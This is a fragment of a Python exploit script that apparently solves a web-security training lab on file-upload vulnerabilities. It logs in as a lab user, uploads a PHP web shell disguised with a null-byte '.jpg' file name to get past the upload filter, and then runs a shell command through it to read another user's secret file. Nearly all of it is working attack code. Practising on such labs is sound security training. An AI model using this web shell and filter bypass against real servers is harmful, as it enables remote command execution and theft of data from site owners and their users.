...
def main():
    ...
    vuln_file = ('RunamiYachiyo.php%00.jpg', "<?php system($_GET['cmd']); ?>", 'application/x-httpd-php')
    login_acc(s, url, '/login', 'wiener', 'peter')
    upload_vuln_file(s, url, '/my-account/avatar', vuln_file, vuln_file[0].split('%')[0])
    secret = get_secret(s, url, f'/files/avatars/{vuln_file[0].split('%')[0]}?cmd=cat /home/carlos/secret')
